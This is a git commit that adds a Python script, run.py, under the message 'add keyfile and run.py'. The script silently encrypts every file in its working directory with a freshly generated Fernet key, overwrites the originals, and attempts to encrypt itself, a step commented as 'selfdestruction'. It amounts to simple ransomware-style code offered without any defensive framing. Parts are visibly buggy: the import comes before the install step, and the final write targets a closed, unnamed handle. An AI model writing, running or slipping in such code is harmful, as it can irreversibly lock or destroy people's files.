2b84399ada66b2f641982884715e3bbf021a899d
Matthe255dev <116518249+Matthe255dev@users.noreply.github.com>
2023-06-24 23:31:01 +0200

    Update
    add keyfile and run.py

---
+++ run.py
@@ -0,0 +1,28 @@
+#!/usr/bin/env python3
+import os
+import sys
+import subprocess
+from cryptography.fernet import Fernet
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
+os.remove("keyfile")
+files = []
+for file in os.listdir():
+    if file == "run.py" or file == "decrypt.py" or file == "keyfile" or file == ".gitattributes":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+key = Fernet.generate_key()
+with open("keyfile", "wb") as keycontent:
+        keycontent.write(key)
+for file in files:
+        with open(file, "rb") as filecontent:
+            content = filecontent.read()
+        enc_content = Fernet(key).encrypt(content)
+        with open(file, "wb") as filecontent:
+            filecontent.write(enc_content)
+#selfdestruction of run.py
+with open("run.py", "rb") as runpy:
+    content = runpy.read()
+enc_content = Fernet(key).encrypt(content)
+with open("run.py", "wb"):
+    runpy.write(enc_content)
